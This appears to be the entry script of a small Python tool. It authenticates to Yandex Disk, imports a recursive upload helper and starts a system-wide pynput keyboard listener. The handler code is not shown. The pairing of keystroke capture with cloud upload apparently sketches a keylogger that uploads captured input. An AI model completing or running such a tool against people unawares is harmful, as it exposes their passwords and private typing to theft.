import yadisk
from auth import get_token, reset_token
from yd import recursive_upload
from pynput import keyboard
from keyboard import on_release


if __name__ == '__main__':

    token = get_token()

    y = yadisk.YaDisk(token=token)

    if y.check_token() is False:
        token = reset_token()
        y = yadisk.YaDisk(token=token)

    with keyboard.Listener(
            on_release=on_release) as listener:
        listener.join()


    # if (token):



